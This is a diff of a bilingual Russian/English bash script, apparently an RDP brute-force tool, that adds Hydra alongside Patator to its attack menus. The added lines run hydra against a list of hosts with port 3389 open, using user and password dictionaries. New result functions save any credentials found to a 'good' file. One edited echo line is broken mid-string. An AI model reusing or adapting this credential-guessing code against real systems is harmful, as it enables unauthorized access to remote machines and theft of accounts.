@@ -1,6 +1,6 @@
 #!/bin/bash
 # NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
-ver=1.27
+ver=1.28
 clear
 ##########################################COLOR######################################
 colorbase="\E[0m"
@@ -13,7 +13,7 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
-rm -rf Results/ paused.conf list all_results 2> /dev/null
+rm -rf Results/ paused.conf hydra.restore list all_results result 2> /dev/null
 }
 ######################################################################################
 CHECKDISTR ()
@@ -66,7 +66,8 @@ depend=$(dpkg -s nmap | grep 'Status' | awk -F':' '/Status: / {print $2}')
 			else
 			echo -e "$aquamarine"
 		while true; do
-		echo    "Требующийся пакет nmap не установлен. Установить?"
+		echo    "Требующийся пакет 
+ не установлен. Установить?"
                 read -p "The required package nmap is not installed Install?[Y][N]" yn
 			case $yn in
 			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install nmap -y; break;;
@@ -89,7 +90,7 @@ depend=$(dpkg -s freerdp-x11 || dpkg -s freerdp2-x11  | grep 'Status' | awk -F':
 		echo    "Требующийся пакет FreeRDP не установлен. Установить?"
                 read -p "The required package FreeRDP is not installed Install?[Y][N]" yn
 			case $yn in
-			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install freerdp-x11 libfreerdp-plugins-standard remmina -y || apt install freerdp2-x11 remmina -y; break;;
+			[Yy]* ) apt-get update -y && apt-get upgrade -y; apt install freerdp-x11 libfreerdp-plugins-standard -y || apt install freerdp2-x11 freerdp2-dev -y; break;;
 			[Nn]* ) exit;;
 			* ) echo "Enter answer [Y] or [N] ";;
 		esac
@@ -98,7 +99,9 @@ fi
 
 }
 ######################################################################################
+#Hydra_F () {
 
+#}
 ######################################################################################
 CLEARALL
 CHECKDISTR
@@ -519,7 +522,6 @@ echo ""
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
 echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
-
 
 
 MAINBRUTEMENURU
@@ -28887,6 +28889,27 @@ echo ""
 fi
 done
 
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Выберите инструмент брутфорса : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                            $green Запуск брутфорса$colorbase"
+echo ""
+
+hydra -l $loginbrute -P $passlist -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTRU_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
 
 clear
 echo -e "                                            $green Запуск брутфорса"
@@ -28907,7 +28930,7 @@ TESTRESULTRU
 exit;
 ./rdp_brute.sh
 fi
-
+fi
 
 if [ "$brutmenu" = "2" ]; then
 echo -e "$aquamarine***************************************************************************************************$green"
@@ -28924,6 +28947,27 @@ break
 echo ""
 fi 
 done
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Выберите инструмент брутфорса : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                            $green Запуск брутфорса$colorbase"
+echo ""
+
+hydra -L $loginlist -p $passbrute -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTRU_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
 
 clear
 echo -e "                                            $green Запуск брутфорса"
@@ -28942,6 +28986,7 @@ TESTRESULTRU
 exit;
 ./rdp_brute.sh
 fi
+fi
 
 if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine****************************************************************************************************$green"
@@ -28958,6 +29003,29 @@ break
 echo ""
 fi
 done
+
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Выберите инструмент брутфорса : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                            $green Запуск брутфорса$colorbase"
+echo ""
+
+hydra -L $loginlist -P $passlist -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTRU_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
 
 clear
 echo -e "                                            $green Запуск брутфорса"
@@ -28978,9 +29046,45 @@ sleep 2
 exit;
 ./rdp_brute.sh
 fi
-
+fi
 
 if [ "$brutmenu" = "4" ]; then
+#BRUTEMENU4 () {
+#echo ""
+#}
+#while BRUTEMENU4
+#do
+#if [[ -s open3389 ]]; then
+#echo -e "\n$red***ОШИБКА! Неверно указаны цели$green"
+#else
+#break
+#echo ""
+#fi
+#done
+
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Выберите инструмент брутфорса : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                            $green Запуск брутфорса$colorbase"
+echo ""
+
+hydra -L $PWD/users -P $PWD/dict/pass -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+TESTRESULTRU_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
 
 clear
 echo -e "                                            $green Запуск брутфорса"
@@ -29000,6 +29104,8 @@ TESTRESULTRU
 exit;
 ./rdp_brute.sh
 fi
+fi
+
 
 if [ "$brutmenu" = "5" ]; then
 echo ""
@@ -29040,6 +29146,28 @@ echo ""
 fi
 done
 
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                          $green Start bruteforceing"
+echo ""
+
+hydra -l $loginbrute -P $passlist -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTEN_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
 clear
 echo -e "                                          $green Start bruteforceing"
 echo ""
@@ -29057,6 +29185,7 @@ TESTRESULTEN
 ./rdp_brute.sh
 exit;
 ./rdp_brute.sh
+fi
 fi
 
 
@@ -29077,6 +29206,29 @@ echo ""
 fi
 done
 
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                          $green Start bruteforceing"
+echo ""
+
+hydra -L $loginlist -p $passbrute -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTEN_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
+
 clear
 echo -e "                                           $green Start bruteforceing"
 echo ""
@@ -29094,7 +29246,7 @@ TESTRESULTEN
 exit;
 ./rdp_brute.sh
 fi
-
+fi
 
 if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
@@ -29111,6 +29263,29 @@ break
 echo ""
 fi
 done
+
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                          $green Start bruteforceing"
+echo ""
+
+hydra -L $loginlist -P $passlist -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTEN_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
 
 clear
 echo -e "                                           $green Start bruteforceing"
@@ -29129,9 +29304,34 @@ TESTRESULTEN
 exit;
 ./rdp_brute.sh
 fi
+fi
 
 if [ "$brutmenu" = "4" ]; then
 clear
+
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                            1.$yellow Hydra$colorbase                                |";
+echo -e "               |   $grey                            2.$yellow Patator$colorbase                              |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                       Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+
+clear
+echo -e "                                          $green Start bruteforceing"
+echo ""
+
+hydra -L $PWD/users -P $PWD/dict/pass -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+TESTRESULTEN_H
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+#fi
+
+	else
+
+
 echo -e "                                           $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
@@ -29140,7 +29340,7 @@ echo ""
 
 python patator.py rdp_login host=FILE0 port=$port user=FILE1 port=$port password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users -C $PWD/dict/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
-#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#hydra -L $PWD/users -P $PWD/dict/pass  -W 3 -o result -I -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 
 clear
 TESTRESULTEN
@@ -29149,6 +29349,7 @@ echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu 
 read -p ""
 
 ./rdp_brute.sh
+fi
 fi
 
 if [ "$brutmenu" = "5" ]; then
@@ -29195,6 +29396,44 @@ exit;
 fi	
 }
 ########################################################################################
+
+######################################TESTRESULTRU_H####################################
+TESTRESULTRU_H () {
+
+clear
+cat $PWD/result | cat $PWD/result |grep -v "Hydra v9.0 run at"| grep -E '[DATA]|[STATUS]|host|login|password' > all_results
+if [ -s all_results ]
+	then
+	#clear
+	cat all_results | grep -E '[DATA]|[STATUS]|host|login|password' >> good
+	cat all_results
+	echo ""
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red   Логин/Пароль найден!    $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+	echo ""
+	echo -e "$yellow*Логин/Пароль записаны в файл $red $PWD/good"
+	echo ""
+	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh	
+	else
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red Логин/Пароль не найден :( $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+ 
+ echo -e ""
+ echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}	
+
+
 ######################################TESTRESULTEN######################################
 TESTRESULTEN ()
 {
@@ -29228,6 +29467,43 @@ exit;
 ./rdp_brute.sh
 fi	
 }
+########################################################################################
+######################################TESTRESULTEN_H####################################
+TESTRESULTEN_H () {
+
+clear
+cat $PWD/result | cat $PWD/result |grep -v "Hydra v9.0 run at"| grep -E '[DATA]|[STATUS]|host|login|password' > all_results
+if [ -s all_results ]
+	then
+	#clear
+	cat all_results | grep -E '[DATA]|[STATUS]|host|login|password' >> good
+	cat all_results
+	echo ""
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red  Login/Password found!  $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+	echo ""
+	echo -e "$yellow*Login/Password written to the file $red $PWD/good$colorbase"
+	echo ""
+	echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh	
+	else
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red Login/Password not found :( $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+ 
+ echo -e ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}	
+
 #######################################CHECKFILERU######################################
 CHECKFILERU ()
 {
